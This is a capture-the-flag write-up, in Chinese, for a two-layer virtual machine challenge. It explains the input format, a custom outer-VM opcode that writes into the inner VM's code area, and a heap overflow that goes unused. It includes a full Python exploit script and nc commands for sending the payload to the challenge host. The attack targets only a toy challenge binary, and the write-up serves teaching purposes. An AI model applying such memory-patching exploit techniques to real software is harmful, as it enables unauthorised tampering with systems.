# EVM - YanamiAnna Writeup

> 关键词：双层 VM、输入格式、RISC-V 子集、物理写、二层 VM patch

## 1. 结论

本题的关键不是常规 libc/堆利用，而是输入被拆成两层 VM 的不同区域：二层 VM 初始字节码会先被严格校验，随后一层 VM 又有一条自定义“物理写”指令可以改写二层 VM 的实际代码区。

最终 payload 做的事情很简单：

1. 给二层 VM 提交合法占位字节 `0x13`，通过初始内容校验；
2. 让一层 VM 执行自定义 `opcode 0x2f`，把二层 VM 第一个字节改成 `0x02`；
3. 二层 VM 从 `0x02` 开始执行，触发 `exit/free_all`，程序干净退出，满足判题条件。

本地验证返回码为 `0`。

## 2. 输入格式

程序的输入不是单纯字符串，而是混合了十进制长度和二进制数据：

```text
outer_code_len\n
outer_heap_pages\n
<outer_code_len bytes: 第一层 VM 字节码>
<outer_heap_pages * 0x1000 bytes: 第一层 VM 初始堆数据>
inner_code_len\n
number_0_to_3\n
<inner_code_len bytes: 第二层 VM 初始字节码>
```

其中第二层 VM 初始字节码必须满足：

```python
inner[i] == b"\x13\x00\x00\x00"[i % 4]
```

也就是说，二层代码区初始只能是：

```python
b"\x13\x00\x00\x00" * n
```

因此不能直接把二层 VM 程序作为输入塞进去，必须先提交合法占位内容，再让第一层 VM 在运行时修改它。

## 3. 第一层 VM

第一层 VM 是一个 RISC-V 风格的解释器，支持常见指令，例如：

- `0x37`: `lui`
- `0x13`: `addi` / op-imm
- `0x03`: load
- `0x23`: 普通 store
- `0x33`: register-register op
- `0x63`: branch
- `0x6f`: jump
- `0x2f`: 题目自定义写指令

关键是 `opcode 0x2f`。它会把寄存器中的值写到：

```text
physical_base + reg[rs1] + imm
```

写入宽度由 `funct3` 控制：

```text
funct3 = 0: byte
funct3 = 1: word
funct3 = 2: dword
funct3 = 3: qword
```

二层 VM 代码区位于第一层物理区偏移：

```text
0x300000
```

因此只要执行：

```asm
lui   x1, 0x300        # x1 = 0x300000
addi  x2, x0, 2        # x2 = 2
xstore.b x2, 0(x1)     # *(physical_base + 0x300000) = 2
```

就可以把二层 VM 第一条指令改成 `0x02`。

## 4. 第二层 VM

第二层 VM opcode 很少：

```text
opcode 0:
    alloc
    格式: 00 + p32(size)

opcode 1:
    edit
    格式: 01 + p32(index) + p32(size) + data

opcode 2:
    free_all / exit
```

`opcode 2` 会依次释放已经分配的 chunk，然后退出二层 VM。由于本解法没有分配 chunk，所以它相当于直接正常退出。

`opcode 1` 中确实有一个 `size <= recorded_size + 4` 的 4 字节堆溢出，但这不是本题最短解需要用到的点。题目提示里强调“输入格式和内容”，核心就是通过合法占位字节绕过二层 VM 初始校验，再由一层 VM patch 二层代码。

## 5. Exploit

完整脚本如下：

```python
#!/usr/bin/env python3
from struct import pack


def p32(x):
    return pack('<I', x & 0xffffffff)


def lui(rd, imm20):
    return ((imm20 & 0xfffff) << 12) | (rd << 7) | 0x37


def addi(rd, rs1, imm):
    return ((imm & 0xfff) << 20) | (rs1 << 15) | (0 << 12) | (rd << 7) | 0x13


def xstore(rs2, rs1, imm=0, width=0):
    return (
        (((imm >> 5) & 0x7f) << 25)
        | (rs2 << 20)
        | (rs1 << 15)
        | ((width & 7) << 12)
        | ((imm & 0x1f) << 7)
        | 0x2f
    )


code = b''.join(map(p32, [
    lui(1, 0x300),       # x1 = 0x300000
    addi(2, 0, 2),       # x2 = 2
    xstore(2, 1, 0, 0),  # *(physical_base + 0x300000) = 2
]))

payload = b''.join([
    str(len(code)).encode(), b'\n',
    b'0\n',         # outer_heap_pages
    code,
    b'1\n',         # inner_code_len
    b'0\n',         # number in [0,3]
    b'\x13',        # legal placeholder; later patched to 0x02
])

open('payload.bin', 'wb').write(payload)
```

本地运行：

```bash
python3 solve_evm.py --local
```

结果：

```text
[+] wrote payload.bin (22 bytes)
[+] local return code: 0
```

如果是远程 nc 服务，则发送生成的 `payload.bin` 即可：

```bash
python3 solve_evm.py --out payload.bin
nc HOST PORT < payload.bin
```

或者使用脚本内置 remote 模式：

```bash
python3 solve_evm.py --remote HOST PORT
```

## 6. 总结

这题容易被第二层 VM 的堆操作误导。`edit` 的 4 字节溢出确实存在，但真正的关键点是：

- 二层 VM 初始代码必须是 `13 00 00 00 ...`；
- 第一层 VM 的 `0x2f` 自定义指令可以写二层 VM 代码区；
- 把二层 VM 第一字节改成 `0x02`，即可让程序正常退出并通过判题。
